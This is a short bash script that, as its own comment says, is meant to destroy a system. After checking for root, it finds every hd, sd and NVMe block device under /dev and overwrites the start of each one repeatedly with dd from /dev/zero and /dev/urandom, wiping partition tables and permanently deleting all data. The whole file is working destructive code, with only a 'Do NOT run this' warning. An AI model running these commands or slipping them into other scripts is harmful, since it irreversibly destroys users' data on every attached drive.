#!/bin/bash

# This script is meant to utterly fuck your system up by erasing the
# partition table of every connected storage device. This will
# permanently delete all your files on every device. Do NOT run this!

# If the script isn't run with sudo / root privileges, quit.
if [[ "$EUID" != "0" ]]; then
	printf '\n%s\n\n' 'You need to be root to run this script!'
	exit
fi

regex_hd='^/dev/hd[[:alpha:]]+$'
regex_sd='^/dev/sd[[:alpha:]]+$'
regex_nvme='^/dev/nvme[0-9]+n[0-9]+$'

regexes=("$regex_hd" "$regex_sd" "$regex_nvme")
sources=('/dev/zero' '/dev/urandom')

declare -a devices

erase_devices () {
	for (( i = 0; i < ${#devices[@]}; i++ )); do
		device="${devices[${i}]}"

		printf '%s ' "$device"

		for n in {1..5}; do
			printf '...%s' "$n"

			for source in "${sources[@]}"; do
				dd if="$source" of="$device" bs=1M count=100 1>&- 2>&-
			done
		done

		printf '\n'
	done
}

mapfile -t devices_tmp < <(find /dev -maxdepth 1 -type b \( -iname "hd*" -o -iname "sd*" -o -iname "nvme*" \) 2>&- | sort -r)

for (( i = 0; i < ${#devices_tmp[@]}; i++ )); do
	device="${devices_tmp[${i}]}"

	for regex in "${regexes[@]}"; do
		if [[ $device =~ $regex ]]; then
			devices+=("$device")
			break
		fi
	done
done

erase_devices
sync
